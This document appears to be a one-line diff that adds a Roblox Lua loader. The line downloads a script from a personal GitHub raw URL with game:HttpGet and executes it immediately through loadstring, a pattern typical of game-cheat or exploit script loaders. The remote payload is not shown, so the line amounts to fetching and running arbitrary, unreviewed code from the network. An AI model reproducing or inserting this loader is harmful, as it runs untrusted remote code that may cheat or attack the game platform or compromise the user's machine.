@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hieuhieu989/vihieuv3/refs/heads/main/VihieuX"))()
